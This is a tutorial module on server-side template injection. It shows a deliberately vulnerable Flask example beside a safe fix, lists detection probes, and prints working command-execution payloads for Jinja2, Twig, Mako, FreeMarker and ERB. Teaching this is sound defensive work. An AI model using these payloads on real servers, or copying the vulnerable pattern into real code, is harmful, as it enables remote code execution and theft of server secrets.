Module 13 — Server-Side Template Injection (SSTI)

Explore how unsanitized user input in template engines can lead to remote code execution.

When Templates Become Code Execution

Template engines are everywhere in web development. Every time you see a webpage that says "Hello, Alice!" with your actual name, a template engine probably generated that page. Jinja2 in Python/Flask, Twig in PHP, ERB in Ruby on Rails, Handlebars in Node.js — they all do the same thing: take a template with placeholder variables and fill in the values.

The problem starts when a developer makes a subtle but catastrophic mistake: instead of passing user input as a variable to the template engine, they concatenate it into the template itself. This means the user's input is not treated as data — it is treated as template code. And template code can do a lot more than just display text.

SSTI is like SQL injection's lesser-known cousin. The pattern is identical: user input ends up in a place where it is interpreted as code instead of data. But while SQLi targets the database, SSTI targets the template engine — and through the template engine, often the entire server.

The Vulnerable Pattern

The critical question is: is user input part of the template, or is it a variable passed to the template?

Vulnerable Code — Input Becomes Template

from flask import Flask, request, render_template_string

@app.route('/greet')
def greet():
    name = request.args.get('name', 'World')
    # DANGEROUS: user input is concatenated INTO the template
    template = f"Hello {name}! Welcome to our site."
    return render_template_string(template)

# If name = "{{7*7}}", the template becomes:
# "Hello {{7*7}}! Welcome to our site."
# Jinja2 evaluates {{7*7}} → the page shows "Hello 49!"

Safe Code — Input Is a Variable

@app.route('/greet')
def greet():
    name = request.args.get('name', 'World')
    # SAFE: user input passed as a variable — never evaluated as template code
    return render_template_string("Hello {{ name }}!", name=name)

# If name = "{{7*7}}", the page shows "Hello {{7*7}}!"
# The curly braces are treated as literal text, not template syntax

The difference is one line of code. In the vulnerable version, the f-string puts the user input into the template string before Jinja2 sees it, so Jinja2 thinks it is template code. In the safe version, Jinja2 knows exactly which parts are template code and which are data.

Detecting SSTI

The first step in exploiting SSTI is detecting it. You inject mathematical expressions in various template syntaxes and see if the server evaluates them. If you send {{7*7}} and the page shows 49, you have confirmed SSTI.

ProbeExpected if VulnerableEngine(s)
{{7*7}}49Jinja2, Twig, Handlebars
{{7*'7'}}7777777Jinja2 specifically (Python string multiplication)
${7*7}49Mako, FreeMarker, Thymeleaf
<%= 7*7 %>49ERB (Ruby)
#{7*7}49Pug/Jade
${{7*7}}49Thymeleaf (Spring)
The Polyglot Probe: A useful universal test is ${{7*7}} — the dollar sign and double braces cover multiple engine syntaxes at once. If you see 49 in the response, you know SSTI exists. The specific syntax that triggered it tells you which engine is in use.

Jinja2 Exploitation — From Math to RCE

OK, so you can make the server compute 7*7. That is cute. But how do you go from evaluating arithmetic to executing operating system commands? In Jinja2 (Python), you exploit Python's object model to traverse the class hierarchy and find dangerous classes.

Here is the thought process, step by step: 

# Step 1: Start with any Python object — an empty string works
{{ ''.__class__ }}
# Output: <class 'str'>
# We now have a reference to the str class

# Step 2: Go up the class hierarchy to the root "object" class
{{ ''.__class__.__mro__ }}
# Output: (<class 'str'>, <class 'object'>)
# __mro__ = Method Resolution Order — the inheritance chain

# Step 3: From "object", list ALL classes in the Python runtime
{{ ''.__class__.__mro__[1].__subclasses__() }}
# Output: [<class 'type'>, <class 'weakref'>, ... HUNDREDS of classes]
# Every class that inherits from "object" is listed here

# Step 4: Find a class that can execute commands
# Look for subprocess.Popen, os._wrap_close, etc.
# The index varies by Python version — you need to find it

# Step 5: Execute a command
{{ ''.__class__.__mro__[1].__subclasses__()[INDEX]('id', shell=True, stdout=-1).communicate() }}
# Output: (b'uid=1000(app) gid=1000(app)\n', None)

This looks complicated, but the logic is straightforward: start with any object, climb to the root of the class hierarchy, enumerate all available classes, find one that can run commands, and use it. There are shorter payloads that accomplish the same thing: 

# Shorter RCE payloads for Jinja2:
{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}
{{ request.application.__self__._get_data_for_json.__globals__['os'].popen('id').read() }}
{{ cycler.__init__.__globals__.os.popen('id').read() }}
Jinja2 Sandboxing: Jinja2 has a SandboxedEnvironment that restricts access to dangerous attributes. However, sandbox escapes have been found repeatedly — for example, accessing __globals__ through unexpected paths. Never rely on the sandbox as your only defense. The real fix is to never put user input into the template string.

SSTI Beyond Jinja2

Other template engines have their own exploitation paths:

  • Twig (PHP): {{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
  • Mako (Python): Uses ${} syntax and has direct Python code execution with <% import os; os.popen('id').read() %>
  • FreeMarker (Java): ${"freemarker.template.utility.Execute"?new()("id")}
  • ERB (Ruby): <%= system('id') %> — almost trivially exploitable since ERB evaluates Ruby code directly
Impact: SSTI almost always leads to Remote Code Execution (RCE). From there, the attacker can read sensitive files (/etc/passwd, application secrets), extract environment variables (API keys, database credentials), pivot to internal services, install backdoors, or completely take over the server. SSTI is a critical severity vulnerability.
